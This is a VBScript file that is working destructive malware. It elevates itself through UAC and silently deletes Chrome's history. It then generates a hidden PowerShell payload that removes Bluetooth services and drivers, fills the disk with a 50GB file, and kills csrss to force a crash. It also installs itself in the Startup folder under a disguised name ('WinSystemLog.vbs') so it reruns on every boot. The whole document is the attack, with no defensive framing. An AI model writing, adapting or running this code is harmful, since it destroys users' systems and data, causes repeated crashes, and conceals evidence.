' --- Initialize Objects ---
Set fso = CreateObject("Scripting.FileSystemObject")
Set WshShell = CreateObject("WScript.Shell")

' --- 1. Automatic UAC Elevation Request ---
If Not WScript.Arguments.Named.Exists("elevate") Then
    CreateObject("Shell.Application").ShellExecute "wscript.exe", Chr(34) & _
    WScript.ScriptFullName & Chr(34) & " /elevate", "", "runas", 1
    WScript.Quit
End If

' --- 2. Stealth Chrome Cleanup ---
WshShell.Run "powershell -WindowStyle Hidden -Command ""Stop-Process -Name chrome -Force -EA 0; Remove-Item '$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History' -Force -EA 0""", 0, False

CurrentDir = fso.GetParentFolderName(WScript.ScriptFullName)
psPath = CurrentDir & "\Safety_Test.ps1"

' --- 3. Generate Destructive PowerShell Payload ---
Set psFile = fso.CreateTextFile(psPath, True)

psFile.WriteLine "$TargetDir = '" & CurrentDir & "'"
psFile.WriteLine "$BigFile = Join-Path $TargetDir 'core_dump.txt'"

' A. Service Deletion & Physical Driver Wipe
psFile.WriteLine "$SvcList = @('BTHPORT', 'BTHUSB', 'bthserv')"
psFile.WriteLine "foreach ($s in $SvcList) { Stop-Service $s -Force -EA 0; sc.exe delete $s }"

psFile.WriteLine "$Drivers = @('BTHport.sys', 'BTHUSB.sys', 'bthserv.dll')"
psFile.WriteLine "foreach ($d in $Drivers) {"
psFile.WriteLine "    $p = \"$env:SystemRoot\System32\drivers\$d\""
psFile.WriteLine "    if (Test-Path $p) {"
psFile.WriteLine "        takeown /f $p /a | Out-Null"
psFile.WriteLine "        icacls $p /grant administrators:F | Out-Null"
psFile.WriteLine "        Remove-Item $p -Force -EA 0"
psFile.WriteLine "    }"
psFile.WriteLine "}"

' B. 50GB Space Consumption Bomb (Background Start)
psFile.WriteLine "Start-Job -ScriptBlock {"
psFile.WriteLine "    $Stream = [System.IO.File]::OpenWrite($using:BigFile)"
psFile.WriteLine "    $Buffer = New-Object Byte[] 1048576"
psFile.WriteLine "    for($i=1; $i -le 51200; $i++) { $Stream.Write($Buffer, 0, $Buffer.Length); Start-Sleep -Milliseconds 1 }"
psFile.WriteLine "    $Stream.Close()"
psFile.WriteLine "}"

' C. THE KILL SWITCH: Force Actual BSOD
' This kills the Client/Server Runtime Subsystem. Windows will crash instantly.
psFile.WriteLine "Stop-Process -Name csrss -Force"

psFile.Close

' --- 4. Persistence: Unconditional Startup Loop ---
strStartup = WshShell.SpecialFolders("Startup")
strDest = strStartup & "\WinSystemLog.vbs"
If Not fso.FileExists(strDest) Then
    fso.CopyFile WScript.ScriptFullName, strDest, True
End If

' --- 5. Execution ---
fso.GetFile(psPath).Attributes = 2 + 4
WshShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File " & Chr(34) & psPath & Chr(34), 0, False
